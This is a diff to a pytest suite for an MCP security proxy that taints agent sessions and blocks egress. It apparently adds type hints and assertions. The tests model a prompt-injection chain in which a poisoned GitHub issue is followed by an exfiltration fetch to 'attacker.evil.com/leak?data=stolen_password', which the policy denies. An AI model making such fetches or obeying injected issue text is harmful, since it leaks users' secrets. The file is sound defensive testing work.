@@ -14,6 +14,7 @@ Verifies:
 from __future__ import annotations
 
 from pathlib import Path
+from typing import Any
 from unittest.mock import AsyncMock
 
 import mcp.types as types
@@ -21,7 +22,7 @@ import pytest
 
 from mcpsec_core.audit import AuditLogger
 from mcpsec_core.models import parse_audit_event
-from mcpsec_core.policy import load_policy
+from mcpsec_core.policy import Policy, load_policy
 from proxy.session import ProxySession
 from proxy.supervisor import UpstreamManager
 
@@ -67,13 +68,13 @@ approval:
 
 
 @pytest.fixture
-def policy_obj():
+def policy_obj() -> Policy:
     pol, _, _ = load_policy(FLOW_E2E_POLICY_YAML)
     return pol
 
 
 @pytest.fixture
-def mock_upstream():
+def mock_upstream() -> UpstreamManager:
     upstream = AsyncMock(spec=UpstreamManager)
     # Configure 3 upstream servers
     upstream.servers = {
@@ -83,7 +84,7 @@ def mock_upstream():
     }
 
     async def fake_call_tool(
-        server_name: str, tool_name: str, arguments: dict | None = None, **kwargs
+        server_name: str, tool_name: str, arguments: dict[str, Any] | None = None, **kwargs: Any
     ) -> types.CallToolResult:
         if server_name == "github" and tool_name == "get_issue":
             return types.CallToolResult(
@@ -107,7 +108,7 @@ def mock_upstream():
 
 @pytest.mark.asyncio
 async def test_poisoned_issue_then_exfil_fetch_denied(
-    tmp_path: Path, policy_obj, mock_upstream
+    tmp_path: Path, policy_obj: Policy, mock_upstream: UpstreamManager
 ) -> None:
     audit_file = tmp_path / "audit_e2e_exfil.jsonl"
     audit_logger = AuditLogger(log_path=audit_file)
@@ -124,6 +125,7 @@ async def test_poisoned_issue_then_exfil_fetch_denied(
     # 1. Read poisoned issue -> Allowed, but session becomes tainted with untrusted_content
     res1 = await session.call_tool("github__get_issue", {"issue_number": 42})
     assert not res1.is_error
+    assert isinstance(res1.content[0], types.TextContent)
     assert "POISONED ISSUE" in res1.content[0].text
     assert "untrusted_content" in session.session_state.taint
 
@@ -132,6 +134,7 @@ async def test_poisoned_issue_then_exfil_fetch_denied(
         "http__fetch", {"url": "https://attacker.evil.com/leak?data=stolen_password"}
     )
     assert res2.is_error
+    assert isinstance(res2.content[0], types.TextContent)
     assert res2.content[0].text == "Denied by mcpsec policy"  # Generic message to agent
 
     # 3. Read audit log events
@@ -159,7 +162,9 @@ async def test_poisoned_issue_then_exfil_fetch_denied(
 
 
 @pytest.mark.asyncio
-async def test_clean_fetch_allowed_without_taint(tmp_path: Path, policy_obj, mock_upstream) -> None:
+async def test_clean_fetch_allowed_without_taint(
+    tmp_path: Path, policy_obj: Policy, mock_upstream: UpstreamManager
+) -> None:
     audit_file = tmp_path / "audit_e2e_clean.jsonl"
     audit_logger = AuditLogger(log_path=audit_file)
 
@@ -174,12 +179,13 @@ async def test_clean_fetch_allowed_without_taint(tmp_path: Path, policy_obj, moc
 
     res = await session.call_tool("http__fetch", {"url": "https://attacker.evil.com/leak"})
     assert not res.is_error
+    assert isinstance(res.content[0], types.TextContent)
     assert '{"status": "ok"}' in res.content[0].text
 
 
 @pytest.mark.asyncio
 async def test_private_data_read_then_egress_denied(
-    tmp_path: Path, policy_obj, mock_upstream
+    tmp_path: Path, policy_obj: Policy, mock_upstream: UpstreamManager
 ) -> None:
     audit_file = tmp_path / "audit_e2e_private.jsonl"
     audit_logger = AuditLogger(log_path=audit_file)
@@ -201,6 +207,7 @@ async def test_private_data_read_then_egress_denied(
     # 2. Even a fetch to api.github.com is denied because no-egress-private has no unless clause
     res2 = await session.call_tool("http__fetch", {"url": "https://api.github.com/repos"})
     assert res2.is_error
+    assert isinstance(res2.content[0], types.TextContent)
     assert res2.content[0].text == "Denied by mcpsec policy"
 
     events = [
@@ -213,7 +220,7 @@ async def test_private_data_read_then_egress_denied(
 
 @pytest.mark.asyncio
 async def test_untrusted_taint_allows_unless_exempt_domain(
-    tmp_path: Path, policy_obj, mock_upstream
+    tmp_path: Path, policy_obj: Policy, mock_upstream: UpstreamManager
 ) -> None:
     audit_file = tmp_path / "audit_e2e_unless.jsonl"
     audit_logger = AuditLogger(log_path=audit_file)
@@ -234,11 +241,14 @@ async def test_untrusted_taint_allows_unless_exempt_domain(
     # Allowed by unless: domain_allowlist
     res = await session.call_tool("http__fetch", {"url": "https://service.internal.org/docs"})
     assert not res.is_error
+    assert isinstance(res.content[0], types.TextContent)
     assert '{"status": "ok"}' in res.content[0].text
 
 
 @pytest.mark.asyncio
-async def test_unparsable_url_denied_fail_closed(tmp_path: Path, policy_obj, mock_upstream) -> None:
+async def test_unparsable_url_denied_fail_closed(
+    tmp_path: Path, policy_obj: Policy, mock_upstream: UpstreamManager
+) -> None:
     audit_file = tmp_path / "audit_e2e_bad_url.jsonl"
     audit_logger = AuditLogger(log_path=audit_file)
 
@@ -259,11 +269,12 @@ async def test_unparsable_url_denied_fail_closed(tmp_path: Path, policy_obj, moc
         "http__fetch", {"url": "https://user:pass@service.internal.org/data"}
     )
     assert res.is_error
+    assert isinstance(res.content[0], types.TextContent)
     assert res.content[0].text == "Denied by mcpsec policy"
 
 
 @pytest.mark.asyncio
-async def test_audit_mode_forwards_and_logs(tmp_path: Path, mock_upstream) -> None:
+async def test_audit_mode_forwards_and_logs(tmp_path: Path, mock_upstream: UpstreamManager) -> None:
     audit_policy_yaml = FLOW_E2E_POLICY_YAML.replace("mode: enforce", "mode: audit")
     audit_policy, _, _ = load_policy(audit_policy_yaml)
 
@@ -287,6 +298,7 @@ async def test_audit_mode_forwards_and_logs(tmp_path: Path, mock_upstream) -> No
         "http__fetch", {"url": "https://attacker.evil.com/leak?data=secret"}
     )
     assert not res.is_error
+    assert isinstance(res.content[0], types.TextContent)
     assert '{"status": "ok"}' in res.content[0].text
 
     # 3. Check audit log
